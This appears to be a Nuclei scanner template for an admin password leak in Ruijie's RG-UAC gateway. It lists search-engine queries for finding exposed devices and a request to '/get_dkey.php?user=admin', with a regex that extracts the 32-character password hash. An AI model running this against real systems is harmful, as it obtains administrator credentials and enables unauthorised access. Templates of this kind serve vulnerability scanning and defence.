id: ruijie-rg-uac-disclosure

info:
  name: 锐捷 RG-UAC 统一上网行为管理与审计系统 - 管理员密码泄露
  author: xiuxin
  severity: high
  description: 锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露。
  metadata:
    fofa-qeury: title="RG-UAC登录页面" && body="admin"
    360-qeury: title:"RG-UAC登录页面" && body:"admin"
    hunter-qeury: web.title:"RG-UAC登录页面" && webb.body:"admin"
    veified: true
    max-request: 1
  tags: ruijie,infoleak,rg-uac

http:
  - raw:
      - |
        GET {{RootURL}}{{path}} HTTP/1.1
        Host: {{Hostname}}

    attack: batteringram
    payloads:
      path:
        - "/"
        - "/get_dkey.php?user=admin"

    stop-at-first-match: true

    matchers:
      - type: regex
        name: infoleak
        part: body
        regex:
          - 'password":"(\w{32})","lastpwdtime"'

      - type: status
        status:
          - 200
    matchers-condition: and